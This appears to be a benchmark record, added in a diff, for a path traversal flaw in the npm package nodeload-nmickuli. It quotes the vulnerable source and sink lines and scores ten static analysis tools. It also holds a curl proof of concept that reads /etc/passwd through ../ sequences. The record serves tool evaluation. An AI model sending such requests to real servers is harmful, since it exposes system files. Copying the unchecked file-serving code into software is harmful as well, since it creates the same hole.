@@ -1,0 +1,63 @@
+{
+    "advisory": {
+        "id": "GHSA-wmcq-3wfx-qjx5",
+        "npm_id": "410",
+        "cwe": "CWE-26",
+        "github_link": "https://github.com/advisories/GHSA-wmcq-3wfx-qjx5"
+    },
+    "correct_cwe": "CWE-24",
+    "correct_package_link": "https://registry.npmjs.org/nodeload-nmickuli/-/nodeload-nmickuli-1.0.3.tgz",
+    "vulnerability": {
+        "vulnerability_location": [
+            {
+                "source": {
+                    "file": "nodeload.js",
+                    "lineno": 94,
+                    "code": "this.running=false;this.connections.forEach(function(c){if(c.destroy){c.destroy();}});this.server.close();this.server=null;this.emit('end');};HttpServer.prototype.addRoute=function(regex,handler){this.routes.unshift({regex:regex,handler:handler});return this;};HttpServer.prototype.removeRoute=function(regex,handler){this.routes=this.routes.filter(function(r){return!((regex===r.regex)&&(!handler||handler===r.handler));});return this;};HttpServer.prototype.route_=function(req,res){for(var i=0;i<this.routes.length;i++){if(req.url.match(this.routes[i].regex)){this.routes[i].handler(req.url,req,res);return;}}"
+                },
+                "sink": {
+                    "file": "nodeload.js",
+                    "lineno": 96,
+                    "code": "fs.readFile(file,\"binary\",function(err,data){if(err){response.writeHead(500,{\"Content-Type\":\"text/plain\"});response.write(\"Error opening file \"+file+\": \"+err);}else{response.writeHead(200,{'Content-Length':data.length});response.write(data,\"binary\");}"
+                }
+            }
+        ]
+    },
+    "poc": [
+        {
+            "code": "curl \"http://localhost:8000/../../../../../../../../etc/passwd\" --path-as-is"
+        }
+    ],
+    "tools": {
+        "codeql": {
+            "score": "A"
+        },
+        "njsscan": {
+            "score": "C"
+        },
+        "graudit": {
+            "score": "B"
+        },
+        "insidersec": {
+            "score": "C"
+        },
+        "eslint": {
+            "score": "B"
+        },
+        "appinspector": {
+            "score": "A"
+        },
+        "msdevskim": {
+            "score": "C"
+        },
+        "drek": {
+            "score": "C"
+        },
+        "mosca": {
+            "score": "C"
+        },
+        "odgen": {
+            "score": "C"
+        }
+    }
+}
